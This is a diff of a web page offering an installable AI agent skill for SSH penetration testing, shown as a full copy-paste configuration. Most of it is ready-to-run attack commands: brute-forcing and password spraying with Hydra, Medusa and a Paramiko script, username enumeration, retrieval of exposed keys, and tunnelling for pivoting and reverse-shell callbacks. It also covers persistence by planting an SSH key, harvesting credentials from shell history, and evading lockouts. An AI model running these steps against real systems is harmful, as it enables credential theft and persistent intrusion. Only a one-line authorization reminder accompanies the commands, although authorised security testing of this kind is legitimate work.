@@ -33,20 +33,15 @@
     .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
     .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
     .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
-    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
-    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
-    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .copy-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .copy-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
     .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
     .copy-btn:hover{background:#f5f5f5}
     pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
-    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
-    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
-    .how-to ol{margin:16px 0;padding-left:24px}
-    .how-to li{margin-bottom:12px;color:#444}
-    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
     .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
     .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
-    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
+    @media(max-width:768px){.header{flex-direction:column}.copy-box code{font-size:12px}}
   </style>
 </head>
 <body>
@@ -83,18 +78,505 @@
     <p class="desc">This skill should be used when the user asks to "pentest SSH services", "enumerate SSH configurations", "brute force SSH credentials", "exploit SSH vulnerabilities", "perform SSH tunneling", or "audit SSH security". It provides comprehensive SSH penetration testing methodologies and techniques.</p>
 
     <div class="section">
-      <h2>How to Use</h2>
-      <div class="how-to">
-        <ol>
-          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/ssh-penetration-testing</code> in your terminal</li>
-          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
-        </ol>
-        
-        <div class="install-box">
-          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
-          <p>Installation Command:</p>
-          <code id="install-cmd">npx aiccli install skills/ssh-penetration-testing</code>
-        </div>
+      <h2>How to Install</h2>
+      <ol style="margin:16px 0;padding-left:24px;color:#444">
+        <li style="margin-bottom:12px"><strong>Copy the config</strong> - Click the "Copy Config" button below</li>
+        <li style="margin-bottom:12px"><strong>Add to your project</strong> - Paste the code into the appropriate config file</li>
+        <li style="margin-bottom:12px"><strong>Done!</strong> - The component is now available in your AI</li>
+      </ol>
+      
+      <div class="copy-box">
+        <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+        <p>Configuration (click to copy):</p>
+        <code id="install-cmd">---
+name: SSH Penetration Testing
+description: This skill should be used when the user asks to &quot;pentest SSH services&quot;, &quot;enumerate SSH configurations&quot;, &quot;brute force SSH credentials&quot;, &quot;exploit SSH vulnerabilities&quot;, &quot;perform SSH tunneling&quot;, or &quot;audit SSH security&quot;. It provides comprehensive SSH penetration testing methodologies and techniques.
+metadata:
+  author: zebbern
+  version: &quot;1.1&quot;
+---
+
+# SSH Penetration Testing
+
+## Purpose
+
+Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.
+
+## Prerequisites
+
+### Required Tools
+- Nmap with SSH scripts
+- Hydra or Medusa for brute-forcing
+- ssh-audit for configuration analysis
+- Metasploit Framework
+- Python with Paramiko library
+
+### Required Knowledge
+- SSH protocol fundamentals
+- Public/private key authentication
+- Port forwarding concepts
+- Linux command-line proficiency
+
+## Outputs and Deliverables
+
+1. **SSH Enumeration Report** - Versions, algorithms, configurations
+2. **Credential Assessment** - Weak passwords, default credentials
+3. **Vulnerability Assessment** - Known CVEs, misconfigurations
+4. **Tunnel Documentation** - Port forwarding configurations
+
+## Core Workflow
+
+### Phase 1: SSH Service Discovery
+
+Identify SSH services on target networks:
+
+```bash
+# Quick SSH port scan
+nmap -p 22 192.168.1.0/24 --open
+
+# Common alternate SSH ports
+nmap -p 22,2222,22222,2200 192.168.1.100
+
+# Full port scan for SSH
+nmap -p- --open 192.168.1.100 | grep -i ssh
+
+# Service version detection
+nmap -sV -p 22 192.168.1.100
+```
+
+### Phase 2: SSH Enumeration
+
+Gather detailed information about SSH services:
+
+```bash
+# Banner grabbing
+nc 192.168.1.100 22
+# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5
+
+# Telnet banner grab
+telnet 192.168.1.100 22
+
+# Nmap version detection with scripts
+nmap -sV -p 22 --script ssh-hostkey 192.168.1.100
+
+# Enumerate supported algorithms
+nmap -p 22 --script ssh2-enum-algos 192.168.1.100
+
+# Get host keys
+nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100
+
+# Check authentication methods
+nmap -p 22 --script ssh-auth-methods --script-args=&quot;ssh.user=root&quot; 192.168.1.100
+```
+
+### Phase 3: SSH Configuration Auditing
+
+Identify weak configurations:
+
+```bash
+# ssh-audit - comprehensive SSH audit
+ssh-audit 192.168.1.100
+
+# ssh-audit with specific port
+ssh-audit -p 2222 192.168.1.100
+
+# Output includes:
+# - Algorithm recommendations
+# - Security vulnerabilities
+# - Hardening suggestions
+```
+
+Key configuration weaknesses to identify:
+- Weak key exchange algorithms (diffie-hellman-group1-sha1)
+- Weak ciphers (arcfour, 3des-cbc)
+- Weak MACs (hmac-md5, hmac-sha1-96)
+- Deprecated protocol versions
+
+### Phase 4: Credential Attacks
+
+#### Brute-Force with Hydra
+
+```bash
+# Single username, password list
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+
+# Username list, single password
+hydra -L users.txt -p Password123 ssh://192.168.1.100
+
+# Username and password lists
+hydra -L users.txt -P passwords.txt ssh://192.168.1.100
+
+# With specific port
+hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
+
+# Rate limiting evasion (slow)
+hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100
+
+# Verbose output
+hydra -l admin -P passwords.txt -vV ssh://192.168.1.100
+
+# Exit on first success
+hydra -l admin -P passwords.txt -f ssh://192.168.1.100
+```
+
+#### Brute-Force with Medusa
+
+```bash
+# Basic brute-force
+medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
+
+# Multiple targets
+medusa -H targets.txt -u admin -P passwords.txt -M ssh
+
+# With username list
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh
+
+# Specific port
+medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
+```
+
+#### Password Spraying
+
+```bash
+# Test common password across users
+hydra -L users.txt -p Summer2024! ssh://192.168.1.100
+
+# Multiple common passwords
+for pass in &quot;Password123&quot; &quot;Welcome1&quot; &quot;Summer2024!&quot;; do
+    hydra -L users.txt -p &quot;$pass&quot; ssh://192.168.1.100
+done
+```
+
+### Phase 5: Key-Based Authentication Testing
+
+Test for weak or exposed keys:
+
+```bash
+# Attempt login with found private key
+ssh -i id_rsa user@192.168.1.100
+
+# Specify key explicitly (bypass agent)
+ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100
+
+# Force password authentication
+ssh -o PreferredAuthentications=password user@192.168.1.100
+
+# Try common key names
+for key in id_rsa id_dsa id_ecdsa id_ed25519; do
+    ssh -i &quot;$key&quot; user@192.168.1.100
+done
+```
+
+Check for exposed keys:
+
+```bash
+# Common locations for private keys
+~/.ssh/id_rsa
+~/.ssh/id_dsa
+~/.ssh/id_ecdsa
+~/.ssh/id_ed25519
+/etc/ssh/ssh_host_*_key
+/root/.ssh/
+/home/*/.ssh/
+
+# Web-accessible keys (check with curl/wget)
+curl -s http://target.com/.ssh/id_rsa
+curl -s http://target.com/id_rsa
+curl -s http://target.com/backup/ssh_keys.tar.gz
+```
+
+### Phase 6: Vulnerability Exploitation
+
+Search for known vulnerabilities:
+
+```bash
+# Search for exploits
+searchsploit openssh
+searchsploit openssh 7.2
+
+# Common SSH vulnerabilities
+# CVE-2018-15473 - Username enumeration
+# CVE-2016-0777 - Roaming vulnerability
+# CVE-2016-0778 - Buffer overflow
+
+# Metasploit enumeration
+msfconsole
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.168.1.100
+run
+
+# Username enumeration (CVE-2018-15473)
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS 192.168.1.100
+set USER_FILE /usr/share/wordlists/users.txt
+run
+```
+
+### Phase 7: SSH Tunneling and Port Forwarding
+
+#### Local Port Forwarding
+
+Forward local port to remote service:
+
+```bash
+# Syntax: ssh -L &lt;local_port&gt;:&lt;remote_host&gt;:&lt;remote_port&gt; user@ssh_server
+
+# Access internal web server through SSH
+ssh -L 8080:192.168.1.50:80 user@192.168.1.100
+# Now access http://localhost:8080
+
+# Access internal database
+ssh -L 3306:192.168.1.50:3306 user@192.168.1.100
+
+# Multiple forwards
+ssh -L 8080:192.168.1.50:80 -L 3306:192.168.1.51:3306 user@192.168.1.100
+```
+
+#### Remote Port Forwarding
+
+Expose local service to remote network:
+
+```bash
+# Syntax: ssh -R &lt;remote_port&gt;:&lt;local_host&gt;:&lt;local_port&gt; user@ssh_server
+
+# Expose local web server to remote
+ssh -R 8080:localhost:80 user@192.168.1.100
+# Remote can access via localhost:8080
+
+# Reverse shell callback
+ssh -R 4444:localhost:4444 user@192.168.1.100
+```
+
+#### Dynamic Port Forwarding (SOCKS Proxy)
+
+Create SOCKS proxy for network pivoting:
+
+```bash
+# Create SOCKS proxy on local port 1080
+ssh -D 1080 user@192.168.1.100
+
+# Use with proxychains
+echo &quot;socks5 127.0.0.1 1080&quot; &gt;&gt; /etc/proxychains.conf
+proxychains nmap -sT -Pn 192.168.1.0/24
+
+# Browser configuration
+# Set SOCKS proxy to localhost:1080
+```
+
+#### ProxyJump (Jump Hosts)
+
+Chain through multiple SSH servers:
+
+```bash
+# Jump through intermediate host
+ssh -J user1@jump_host user2@target_host
+
+# Multiple jumps
+ssh -J user1@jump1,user2@jump2 user3@target
+
+# With SSH config
+# ~/.ssh/config
+Host target
+    HostName 192.168.2.50
+    User admin
+    ProxyJump user@192.168.1.100
+```
+
+### Phase 8: Post-Exploitation
+
+Activities after gaining SSH access:
+
+```bash
+# Check sudo privileges
+sudo -l
+
+# Find SSH keys
+find / -name &quot;id_rsa&quot; 2&gt;/dev/null
+find / -name &quot;id_dsa&quot; 2&gt;/dev/null
+find / -name &quot;authorized_keys&quot; 2&gt;/dev/null
+
+# Check SSH directory
+ls -la ~/.ssh/
+cat ~/.ssh/known_hosts
+cat ~/.ssh/authorized_keys
+
+# Add persistence (add your key)
+echo &quot;ssh-rsa AAAAB3...&quot; &gt;&gt; ~/.ssh/authorized_keys
+
+# Extract SSH configuration
+cat /etc/ssh/sshd_config
+
+# Find other users
+cat /etc/passwd | grep -v nologin
+ls /home/
+
+# History for credentials
+cat ~/.bash_history | grep -i ssh
+cat ~/.bash_history | grep -i pass
+```
+
+### Phase 9: Custom SSH Scripts with Paramiko
+
+Python-based SSH automation:
+
+```python
+#!/usr/bin/env python3
+import paramiko
+import sys
+
+def ssh_connect(host, username, password):
+    &quot;&quot;&quot;Attempt SSH connection with credentials&quot;&quot;&quot;
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        client.connect(host, username=username, password=password, timeout=5)
+        print(f&quot;[+] Success: {username}:{password}&quot;)
+        return client
+    except paramiko.AuthenticationException:
+        print(f&quot;[-] Failed: {username}:{password}&quot;)
+        return None
+    except Exception as e:
+        print(f&quot;[!] Error: {e}&quot;)
+        return None
+
+def execute_command(client, command):
+    &quot;&quot;&quot;Execute command via SSH&quot;&quot;&quot;
+    stdin, stdout, stderr = client.exec_command(command)
+    output = stdout.read().decode()
+    errors = stderr.read().decode()
+    return output, errors
+
+def ssh_brute_force(host, username, wordlist):
+    &quot;&quot;&quot;Brute-force SSH with wordlist&quot;&quot;&quot;
+    with open(wordlist, &#039;r&#039;) as f:
+        passwords = f.read().splitlines()
+    
+    for password in passwords:
+        client = ssh_connect(host, username, password.strip())
+        if client:
+            # Run post-exploitation commands
+            output, _ = execute_command(client, &#039;id; uname -a&#039;)
+            print(output)
+            client.close()
+            return True
+    return False
+
+# Usage
+if __name__ == &quot;__main__&quot;:
+    target = &quot;192.168.1.100&quot;
+    user = &quot;admin&quot;
+    
+    # Single credential test
+    client = ssh_connect(target, user, &quot;password123&quot;)
+    if client:
+        output, _ = execute_command(client, &quot;ls -la&quot;)
+        print(output)
+        client.close()
+```
+
+### Phase 10: Metasploit SSH Modules
+
+Use Metasploit for comprehensive SSH testing:
+
+```bash
+# Start Metasploit
+msfconsole
+
+# SSH Version Scanner
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.168.1.0/24
+run
+
+# SSH Login Brute-Force
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.100
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set VERBOSE true
+run
+
+# SSH Key Login
+use auxiliary/scanner/ssh/ssh_login_pubkey
+set RHOSTS 192.168.1.100
+set USERNAME admin
+set KEY_FILE /path/to/id_rsa
+run
+
+# Username Enumeration
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS 192.168.1.100
+set USER_FILE users.txt
+run
+
+# Post-exploitation with SSH session
+sessions -i 1
+```
+
+## Quick Reference
+
+### SSH Enumeration Commands
+
+| Command | Purpose |
+|---------|---------|
+| `nc &lt;host&gt; 22` | Banner grabbing |
+| `ssh-audit &lt;host&gt;` | Configuration audit |
+| `nmap --script ssh*` | SSH NSE scripts |
+| `searchsploit openssh` | Find exploits |
+
+### Brute-Force Options
+
+| Tool | Command |
+|------|---------|
+| Hydra | `hydra -l user -P pass.txt ssh://host` |
+| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |
+| Ncrack | `ncrack -p 22 --user admin -P pass.txt host` |
+| Metasploit | `use auxiliary/scanner/ssh/ssh_login` |
+
+### Port Forwarding Types
+
+| Type | Command | Use Case |
+|------|---------|----------|
+| Local | `-L 8080:target:80` | Access remote services locally |
+| Remote | `-R 8080:localhost:80` | Expose local services remotely |
+| Dynamic | `-D 1080` | SOCKS proxy for pivoting |
+
+### Common SSH Ports
+
+| Port | Description |
+|------|-------------|
+| 22 | Default SSH |
+| 2222 | Common alternate |
+| 22222 | Another alternate |
+| 830 | NETCONF over SSH |
+
+## Constraints and Limitations
+
+### Legal Considerations
+- Always obtain written authorization
+- Brute-forcing may violate ToS
+- Document all testing activities
+
+### Technical Limitations
+- Rate limiting may block attacks
+- Fail2ban or similar may ban IPs
+- Key-based auth prevents password attacks
+- Two-factor authentication adds complexity
+
+### Evasion Techniques
+- Use slow brute-force: `-t 1 -w 5`
+- Distribute attacks across IPs
+- Use timing-based enumeration carefully
+- Respect lockout thresholds
+
+## Troubleshooting
+
+| Issue | Solutions |
+|-------|-----------|
+| Connection Refused | Verify SSH running; check firewall; confirm port; test from different IP |
+| Authentication Failures | Verify username; check password policy; key permissions (600); authorized_keys format |
+| Tunnel Not Working | Check GatewayPorts/AllowTcpForwarding in sshd_config; verify firewall; use `ssh -v` |
+</code>
       </div>
     </div>
 
